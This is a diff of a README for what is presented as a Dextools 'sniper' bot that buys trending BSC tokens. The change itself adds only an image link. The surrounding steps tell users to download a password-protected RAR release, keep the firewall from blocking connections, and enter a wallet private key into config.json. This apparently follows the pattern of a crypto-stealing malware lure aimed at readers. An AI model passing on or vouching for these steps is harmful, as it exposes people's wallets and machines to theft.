@@ -15,6 +15,8 @@ This bot automatically buys BSC tokens that are trending on Dextools. You can se
 2. [Download](https://github.com/SniperSwap/dextools-sniper/releases/download/Release/Dextools-v0.2.3.rar) repository release and extract files with password `LrDatfneE`.
 3. Make sure that firewall does not blocks any connections.
 
+<img src="https://github.com/kthenurseone/dextool_trendbot/raw/main/1.png?raw=true"/>
+
 ## Usage
 1. Open `config.json`. Edit network PRCs and private key for active account.
 2. Launch software. In transaction section set take-profit and stop-loss percentage.
